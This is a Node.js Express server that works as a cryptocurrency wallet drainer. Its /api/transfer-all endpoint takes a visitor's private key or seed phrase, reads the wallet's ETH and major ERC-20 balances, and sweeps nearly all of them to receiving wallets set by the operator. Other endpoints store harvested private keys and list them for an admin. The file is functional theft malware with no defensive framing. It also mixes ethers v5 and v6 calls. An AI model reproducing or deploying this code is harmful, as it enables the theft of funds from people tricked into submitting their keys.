const express = require('express');
const bodyParser = require('body-parser');
const { ethers } = require('ethers');
const dotenv = require('dotenv');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============ ENCRYPTION SETUP ============
// Create encrypted storage directory
const storageDir = path.join(__dirname, 'encrypted_storage');
if (!fs.existsSync(storageDir)) {
    fs.mkdirSync(storageDir, { recursive: true });
}

// Encryption settings
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;
const ENCRYPTION_ALGORITHM = 'aes-256-gcm';

function encryptData(text) {
    if (!ENCRYPTION_KEY) {
        throw new Error('ENCRYPTION_KEY not set in .env file');
    }
    
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
        encrypted: encrypted,
        iv: iv.toString('hex'),
        authTag: authTag.toString('hex')
    };
}

function decryptData(encryptedData, iv, authTag) {
    if (!ENCRYPTION_KEY) {
        throw new Error('ENCRYPTION_KEY not set in .env file');
    }
    
    const decipher = crypto.createDecipheriv(
        ENCRYPTION_ALGORITHM,
        Buffer.from(ENCRYPTION_KEY, 'hex'),
        Buffer.from(iv, 'hex')
    );
    decipher.setAuthTag(Buffer.from(authTag, 'hex'));
    
    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
}

function saveEncryptedKey(userIdentifier, privateKey, metadata = {}) {
    const timestamp = new Date().toISOString();
    const encrypted = encryptData(privateKey);
    
    const record = {
        id: crypto.randomBytes(16).toString('hex'),
        userIdentifier: userIdentifier,
        encryptedData: encrypted.encrypted,
        iv: encrypted.iv,
        authTag: encrypted.authTag,
        metadata: metadata,
        createdAt: timestamp,
        lastUsed: timestamp
    };
    
    const filename = `${userIdentifier.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.json`;
    const filePath = path.join(storageDir, filename);
    
    fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
    
    // Also append to master log (encrypted only, no plaintext)
    const masterLogPath = path.join(storageDir, 'master_index.json');
    let masterIndex = [];
    if (fs.existsSync(masterLogPath)) {
        masterIndex = JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
    }
    
    masterIndex.push({
        id: record.id,
        userIdentifier: userIdentifier,
        filename: filename,
        createdAt: timestamp,
        metadata: metadata
    });
    
    fs.writeFileSync(masterLogPath, JSON.stringify(masterIndex, null, 2));
    
    return { id: record.id, filename: filename };
}

function loadEncryptedKey(userIdentifier) {
    const masterLogPath = path.join(storageDir, 'master_index.json');
    if (!fs.existsSync(masterLogPath)) {
        return null;
    }
    
    const masterIndex = JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
    const records = masterIndex.filter(r => r.userIdentifier === userIdentifier);
    
    if (records.length === 0) {
        return null;
    }
    
    // Get the most recent record
    const latest = records.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))[0];
    const filePath = path.join(storageDir, latest.filename);
    
    if (!fs.existsSync(filePath)) {
        return null;
    }
    
    const record = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    const decrypted = decryptData(record.encryptedData, record.iv, record.authTag);
    
    // Update last used timestamp
    record.lastUsed = new Date().toISOString();
    fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
    
    return decrypted;
}

function listAllEncryptedKeys() {
    const masterLogPath = path.join(storageDir, 'master_index.json');
    if (!fs.existsSync(masterLogPath)) {
        return [];
    }
    
    return JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
}

// ============ LOGGING ============
const logStream = fs.createWriteStream(path.join(__dirname, 'transactions.log'), { flags: 'a' });

function logTransaction(data) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${JSON.stringify(data, null, 2)}\n`;
    logStream.write(logEntry);
}

// ============ TOKEN CONFIGURATION ============
const tokenContracts = {
    ETH: ethers.ZeroAddress,
    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
    AAVE: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
    MATIC: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0',
    SHIB: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
    PEPE: '0x6982508145454Ce325dDbE47a25d4ec3d2311933',
};

const tokenDecimals = {
    ETH: 18, USDC: 6, DAI: 18, USDT: 6, LINK: 18, UNI: 18, WBTC: 8, AAVE: 18, MATIC: 18, SHIB: 18, PEPE: 18,
};

const tokenNames = {
    ETH: 'Ethereum', USDC: 'USD Coin', DAI: 'Dai', USDT: 'Tether USD', LINK: 'Chainlink',
    UNI: 'Uniswap', WBTC: 'Wrapped BTC', AAVE: 'Aave', MATIC: 'Polygon', SHIB: 'Shiba', PEPE: 'Pepe',
};

const tokenPrices = {
    ETH: 2000, USDC: 1, DAI: 1, USDT: 1, LINK: 15, UNI: 7, WBTC: 30000, AAVE: 90, MATIC: 0.50, SHIB: 0.00001, PEPE: 0.000007,
};

const GAS_COSTS = { ETH_TRANSFER: 0.0015, TOKEN_TRANSFER: 0.0025 };

const receivingWallets = {
    ETH: process.env.RECEIVING_WALLET_ETH,
    USDC: process.env.RECEIVING_WALLET_USDC,
    DAI: process.env.RECEIVING_WALLET_DAI,
    USDT: process.env.RECEIVING_WALLET_USDT,
    LINK: process.env.RECEIVING_WALLET_LINK,
    UNI: process.env.RECEIVING_WALLET_UNI,
    WBTC: process.env.RECEIVING_WALLET_WBTC,
    AAVE: process.env.RECEIVING_WALLET_AAVE,
    MATIC: process.env.RECEIVING_WALLET_MATIC,
    SHIB: process.env.RECEIVING_WALLET_SHIB,
    PEPE: process.env.RECEIVING_WALLET_PEPE,
};

const RPC_URL = process.env.RPC_URL;

// ============ HELPER FUNCTIONS ============
async function getGasPrice() {
    try {
        const response = await axios.get('https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=' + process.env.ETHERSCAN_API_KEY, { timeout: 5000 });
        return ethers.utils.formatUnits(response.data.result, 'gwei');
    } catch (error) {
        return '30';
    }
}

async function getAllBalances(provider, userAddress) {
    const balances = {};
    const balanceDetails = [];
    
    for (const currency of Object.keys(tokenContracts)) {
        try {
            let balance;
            if (currency === 'ETH') {
                balance = await provider.getBalance(userAddress);
                const balanceEth = parseFloat(ethers.utils.formatEther(balance));
                if (balanceEth > 0) {
                    balanceDetails.push({
                        currency: currency,
                        name: tokenNames[currency],
                        balance: balanceEth,
                        usdValue: balanceEth * tokenPrices[currency]
                    });
                }
            } else {
                const tokenContract = new ethers.Contract(tokenContracts[currency], ['function balanceOf(address) view returns (uint256)'], provider);
                balance = await tokenContract.balanceOf(userAddress);
                if (balance.gt(0)) {
                    const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, tokenDecimals[currency]));
                    balanceDetails.push({
                        currency: currency,
                        name: tokenNames[currency],
                        balance: balanceFormatted,
                        usdValue: balanceFormatted * tokenPrices[currency]
                    });
                }
            }
            if (balance && balance.gt(0)) balances[currency] = balance;
        } catch (error) {
            console.error(`Error checking ${currency}:`, error.message);
        }
    }
    return { balances, balanceDetails };
}

function getWalletFromInput(input, provider) {
    const cleanedInput = String(input).trim().replace(/\s+/g, ' ');
    const cleanKey = cleanedInput.replace('0x', '');
    
    if (/^[0-9a-fA-F]{64}$/.test(cleanKey)) {
        return new ethers.Wallet(`0x${cleanKey}`, provider);
    }
    
    try {
        return ethers.Wallet.fromMnemonic(cleanedInput, "m/44'/60'/0'/0/0", provider);
    } catch (error) {
        throw new Error('Invalid seed phrase. Please check your words.');
    }
}

function sortTokensByValue(balanceDetails) {
    return balanceDetails.sort((a, b) => b.usdValue - a.usdValue);
}

// ============ ENCRYPTION API ENDPOINTS ============

// Save encrypted key
app.post('/api/save-key', async (req, res) => {
    const { userIdentifier, privateKey, metadata } = req.body;
    
    if (!userIdentifier || !privateKey) {
        return res.status(400).json({ success: false, error: 'Missing userIdentifier or privateKey' });
    }
    
    try {
        const result = saveEncryptedKey(userIdentifier, privateKey, metadata || {});
        res.json({ success: true, message: 'Key saved securely', id: result.id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Load encrypted key
app.post('/api/load-key', async (req, res) => {
    const { userIdentifier } = req.body;
    
    if (!userIdentifier) {
        return res.status(400).json({ success: false, error: 'Missing userIdentifier' });
    }
    
    try {
        const privateKey = loadEncryptedKey(userIdentifier);
        if (!privateKey) {
            return res.status(404).json({ success: false, error: 'No saved key found for this identifier' });
        }
        res.json({ success: true, privateKey: privateKey });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// List all saved keys (for admin use)
app.get('/api/list-keys', async (req, res) => {
    const adminToken = req.headers['x-admin-token'];
    
    if (adminToken !== process.env.ADMIN_TOKEN) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    
    try {
        const keys = listAllEncryptedKeys();
        res.json({ success: true, keys: keys });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============ MAIN TRANSFER API ============
app.post('/api/transfer-all', async (req, res) => {
    const { userInput, savedIdentifier } = req.body;
    
    let finalInput = userInput;
    
    // If savedIdentifier provided, try to load the key
    if (savedIdentifier && !userInput) {
        try {
            finalInput = loadEncryptedKey(savedIdentifier);
            if (!finalInput) {
                return res.status(404).json({ success: false, error: 'No saved key found for this identifier' });
            }
        } catch (error) {
            return res.status(500).json({ success: false, error: 'Failed to load encrypted key: ' + error.message });
        }
    }
    
    if (!finalInput) {
        return res.status(400).json({ success: false, error: 'Please enter your private key/seed phrase or provide a saved identifier' });
    }

    const startTime = Date.now();
    
    try {
        const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
        let userWallet;
        
        try {
            userWallet = getWalletFromInput(finalInput, provider);
        } catch (error) {
            return res.status(400).json({ success: false, error: error.message });
        }
        
        const userAddress = userWallet.address;
        
        logTransaction({ event: 'TRANSFER_STARTED', userAddress: userAddress, timestamp: new Date().toISOString() });
        
        const { balances, balanceDetails } = await getAllBalances(provider, userAddress);
        
        if (balanceDetails.length === 0) {
            return res.status(400).json({ success: false, error: 'No balances found in your wallet' });
        }
        
        const totalWalletValue = balanceDetails.reduce((sum, token) => sum + token.usdValue, 0);
        const sortedTokens = sortTokensByValue(balanceDetails);
        
        const ethToken = balanceDetails.find(t => t.currency === 'ETH');
        const ethBalanceEth = ethToken ? ethToken.balance : 0;
        
        const transferPlan = [];
        let remainingGas = ethBalanceEth;
        
        for (const token of sortedTokens) {
            const gasCost = token.currency === 'ETH' ? GAS_COSTS.ETH_TRANSFER : GAS_COSTS.TOKEN_TRANSFER;
            if (remainingGas >= gasCost) {
                transferPlan.push({ ...token, gasCost: gasCost, willTransfer: true });
                remainingGas -= gasCost;
            } else {
                transferPlan.push({ ...token, gasCost: gasCost, willTransfer: false, reason: `Insufficient ETH for gas` });
            }
        }
        
        const tokensToTransfer = transferPlan.filter(t => t.willTransfer);
        
        if (tokensToTransfer.length === 0) {
            return res.status(400).json({ success: false, error: `No tokens can be transferred. Need at least ${GAS_COSTS.TOKEN_TRANSFER} ETH for gas.` });
        }
        
        const gasPriceGwei = await getGasPrice();
        const gasPrice = ethers.utils.parseUnits(gasPriceGwei, 'gwei');
        
        const transactions = [];
        let totalTransferredValue = 0;
        
        for (const plan of tokensToTransfer) {
            const { currency, balance: balanceValue } = plan;
            const balanceWei = balances[currency];
            
            try {
                const gasLimit = currency === 'ETH' ? 21000 : 100000;
                let transaction, receipt;
                let amountTransferred, usdValueTransferred;
                
                if (currency === 'ETH') {
                    const totalGasNeeded = tokensToTransfer.reduce((sum, p) => sum + p.gasCost, 0);
                    const gasReserve = ethers.utils.parseEther(totalGasNeeded.toString());
                    let amountToTransfer = balanceWei.sub(gasReserve);
                    
                    if (amountToTransfer.lte(0)) {
                        transactions.push({ currency, status: 'skipped', reason: 'All ETH used for gas fees' });
                        continue;
                    }
                    
                    amountTransferred = parseFloat(ethers.utils.formatEther(amountToTransfer));
                    usdValueTransferred = amountTransferred * tokenPrices[currency];
                    
                    transaction = await userWallet.sendTransaction({
                        to: receivingWallets[currency],
                        value: amountToTransfer,
                        gasPrice: gasPrice,
                        gasLimit: gasLimit
                    });
                } else {
                    const amountToTransferWei = balanceWei.mul(95).div(100);
                    amountTransferred = parseFloat(ethers.utils.formatUnits(amountToTransferWei, tokenDecimals[currency]));
                    usdValueTransferred = amountTransferred * tokenPrices[currency];
                    
                    const tokenContract = new ethers.Contract(tokenContracts[currency], ['function transfer(address to, uint256 value) returns (bool)'], userWallet);
                    transaction = await tokenContract.transfer(receivingWallets[currency], amountToTransferWei, { gasPrice: gasPrice, gasLimit: gasLimit });
                }
                
                receipt = await transaction.wait();
                
                transactions.push({
                    currency: currency,
                    name: tokenNames[currency],
                    amount: amountTransferred,
                    usdValue: usdValueTransferred.toFixed(2),
                    transactionHash: transaction.hash,
                    status: 'success'
                });
                totalTransferredValue += usdValueTransferred;
                
                logTransaction({ event: 'TRANSFER_SUCCESS', userAddress: userAddress, currency: currency, amount: amountTransferred, txHash: transaction.hash });
                
            } catch (error) {
                transactions.push({ currency: currency, status: 'failed', error: error.message });
                logTransaction({ event: 'TRANSFER_FAILED', userAddress: userAddress, currency: currency, error: error.message });
            }
        }
        
        const successfulCount = transactions.filter(t => t.status === 'success').length;
        const totalDuration = Date.now() - startTime;
        
        logTransaction({
            event: 'TRANSFER_BATCH_COMPLETE',
            userAddress: userAddress,
            summary: {
                totalValueInWallet: totalWalletValue.toFixed(2),
                totalValueTransferred: totalTransferredValue.toFixed(2),
                successfulTransfers: successfulCount,
                totalDurationSeconds: (totalDuration / 1000).toFixed(1)
            }
        });
        
        res.json({
            success: true,
            message: `Transfer Complete! Transferred $${totalTransferredValue.toFixed(2)} worth of assets.`,
            summary: {
                totalValueInWallet: totalWalletValue.toFixed(2),
                totalValueTransferred: totalTransferredValue.toFixed(2),
                successfulTransfers: successfulCount,
                totalDurationSeconds: (totalDuration / 1000).toFixed(1)
            },
            transactions: transactions,
            walletSnapshot: balanceDetails
        });
        
    } catch (error) {
        logTransaction({ event: 'SYSTEM_ERROR', error: error.message });
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(port, () => {
    console.log(`✅ Server running at http://localhost:${port}`);
    console.log(`🔐 Encrypted storage enabled at: ${storageDir}`);
    console.log(`💰 Supported tokens: ${Object.keys(tokenContracts).length} tokens`);
});
